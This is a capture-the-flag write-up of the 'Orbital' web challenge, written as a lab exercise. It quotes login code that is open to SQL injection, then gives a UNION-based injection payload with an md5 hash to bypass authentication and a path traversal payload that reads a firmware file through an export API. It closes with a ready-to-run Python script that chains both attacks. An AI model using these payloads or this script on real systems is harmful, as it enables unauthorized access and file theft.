## Orbital :: Easy
#### Scenario 

```
 Orbital
 In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?
```

#### Solve
##### Auth bypass

![](/images/orbital-source-tree.png)

This challenge builds on the basics of SQL Injection explored in the `Drobots` challenge.  
It is another case of login bypass, with a much more interesting payload.  

The login logic for the application is the following:  

```python
def login(username, password):
    # I don't think it's not possible to bypass login because I'm verifying the password later.
    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)

    if user:
        passwordCheck = passwordVerify(user['password'], password)

        if passwordCheck:
            token = createJWT(user['username'])
            return token
    else:
        return False
```

In a query like this, you could use UNION to include a handcrafted row.  
This way you can provide a username and the hashed password of your choice.  

The application will internally use these values when comparing the provided password with the hashed one.

```python
user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)
```

We can see that the application uses the `md5` algorithm to hash the passwords before storage.  
This is in the `util.py:passwordVerify` function.  

```python
def passwordVerify(hashPassword, password):
    md5Hash = hashlib.md5(password.encode())

    if md5Hash.hexdigest() == hashPassword: return True
    else: return False
```

This means that we have to provide the password hashed with `md5` in our payload.  

Payload:  

```
owned" UNION SELECT "admin","21232f297a57a5a743894a0e4a801fc3" FROM users;#
```

`admin`: is the target user.  
`21232f297a57a5a743894a0e4a801fc3`: is the md5 hash of "admin".  

When logging in we provide the injection in the username input and the password 'admin' in the password input.  
  
Here is the resulting query executing on the database:  

```sql
SELECT username, password FROM users WHERE username = "owned" UNION SELECT "admin", "21232f297a57a5a743894a0e4a801fc3" FROM users;#"
```

When executing, the database will not return results for the `owned` username, which means it will use our specified row.  

![](/images/orbital_login.png)

We are then logged into a dashboard:  

![](/images/orbital_dashboard.png)

##### LFI in export function

In this dashboard, there is an export function for various communications.  

![](/images/orbital_export.png)

The application has an export api that relatively includes an mp3 file.  
This file is then downloaded.  

By using path traversal, we can traverse the filesystem back to the root directory to include our target `signal_sleuth_firmware`.  

![](/images/orbital_export_request.png)

With the following payload:  

```json
{
    "name":"../../../../../../../../../../../signal_sleuth_firmware"
}
```

Once we obtain this file, it contains the flag !  

#### Script
```python
#!/usr/bin/env python3
import requests

TARGET = "http://10.18.232.1:1337"
LOGIN_ENDPOINT = "/api/login"
EXPORT_ENDPOINT = "/api/export"
PAYLOAD = "owned\" UNION SELECT \"admin\",\"21232f297a57a5a743894a0e4a801fc3\" FROM users;#"
FLAG_LFI_PAYLOAD = {"name": "../../../../../../../../../../../signal_sleuth_firmware"}

if __name__ == "__main__":
    print("[*] BYPASSING LOGIN")
    s = requests.Session()
    s.post(TARGET + LOGIN_ENDPOINT,
                  json={"username": PAYLOAD, "password": "admin"})

    print("[*] Using Path Traversal + LFI to include flag")
    flag = s.post(TARGET + EXPORT_ENDPOINT, json=FLAG_LFI_PAYLOAD)
    print(flag.text)
```


